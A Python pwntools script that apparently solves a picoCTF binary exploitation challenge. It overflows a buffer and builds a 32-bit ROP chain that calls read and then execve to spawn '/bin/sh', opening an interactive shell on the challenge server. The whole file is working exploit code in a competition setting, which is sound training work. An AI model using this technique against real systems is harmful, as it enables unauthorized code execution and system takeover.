#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
context.binary = exe

PADDING = b'A' * 28     # cyclic -n 4 --lookup 0x61616168


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 54202)

    return r


def exploit():
    rop = ROP(exe)

    str_buff = 0x80e5000        # RW memory location for '/bin/sh' string

    pop_eax = rop.find_gadget(['pop eax', 'ret'])[0]
    pop_ecx = rop.find_gadget(['pop ecx', 'ret'])[0]
    pop_edx_ebx = rop.find_gadget(['pop edx', 'pop ebx', 'ret'])[0]     # 2 register 1 gadget
    int_x80 = rop.find_gadget(['int 0x80', 'ret'])[0]

    # READ
    payload =  PADDING
    payload += p32(pop_eax) + p32(3)                    # SYSCALL number for 'read'
    payload += p32(pop_ecx) + p32(str_buff)             # Buffer location
    payload += p32(pop_edx_ebx) + p32(8) + p32(0)       # Bytes to read and FD (output)
    payload += p32(int_x80)

    # EXECVE
    payload += p32(pop_eax) + p32(11)                       # SYSCALL number
    payload += p32(pop_ecx) + p32(0)                        # 2nd argument
    payload += p32(pop_edx_ebx) + p32(0) + p32(str_buff)    # 1st and 3rd arguments
    payload += p32(int_x80)                                 # SYSCALL performed

    r.sendlineafter(b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n', payload)

    input('Read SYSCALL performed, press ENTER to insert the command')
    r.sendline(b'/bin/sh\x00')

    r.interactive()


def main():
    r = conn()

    exploit()


if __name__ == "__main__":
    main()
